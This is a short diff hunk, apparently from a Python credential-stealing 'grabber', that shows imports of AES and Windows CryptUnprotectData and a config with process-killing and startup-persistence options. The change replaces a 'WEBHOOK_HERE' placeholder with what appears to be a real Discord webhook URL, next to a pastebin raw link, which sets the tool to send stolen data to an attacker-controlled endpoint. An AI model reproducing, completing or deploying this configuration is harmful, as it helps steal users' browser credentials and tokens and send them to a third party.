@@ -20,7 +20,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/1503490230035157033/YsvIRvkXif4lL-8PsSyDNELERWmXuFwb-N0-U4HJl3Tt8cQmzJmBZM36CvVymm_yXavY",
     'Webhook': "https://pastebin.com/raw/fvD14GBA",
     'kill_processes': True,
     'startup': True,
